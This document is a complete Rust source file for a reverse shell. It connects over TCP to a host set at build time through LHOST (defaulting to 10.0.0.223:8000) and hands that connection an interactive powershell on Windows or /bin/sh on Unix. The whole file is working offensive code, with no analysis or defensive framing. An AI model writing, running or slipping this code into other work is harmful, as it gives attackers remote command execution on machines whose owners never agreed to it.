use std::process::Stdio;
use tokio::io;
use tokio::net::TcpStream;
use tokio::process::Command;

#[cfg(windows)]
async fn establish_stream(stream: TcpStream) -> Result<(), Box<dyn std::error::Error>> {
    let mut child = Command::new("powershell")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .spawn()
        .unwrap();

    let (mut stream_read, mut stream_write) = stream.into_split();

    let stdin_writer = async move {
        io::copy(&mut stream_read, &mut child.stdin.take().unwrap())
            .await
            .unwrap();
    };
    let stdout_writer = async move {
        io::copy(&mut child.stdout.take().unwrap(), &mut stream_write)
            .await
            .unwrap();
    };

    tokio::join!(stdin_writer, stdout_writer);
    Ok(())
}

#[cfg(unix)]
async fn establish_stream(stream: TcpStream) -> Result<(), Box<dyn std::error::Error>> {
    use std::os::fd::{AsRawFd, FromRawFd};
    let fd = stream.as_raw_fd();

    Command::new("/bin/sh")
        .stdin(Stdio::from(unsafe { Stdio::from_raw_fd(fd) }))
        .stdout(Stdio::from(unsafe { Stdio::from_raw_fd(fd) }))
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn()
        .unwrap()
        .wait()
        .unwrap();

    Ok(())
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let home = option_env!("LHOST").unwrap_or("10.0.0.223:8000");

    let s = TcpStream::connect(home).await.unwrap();

    establish_stream(s).await
}
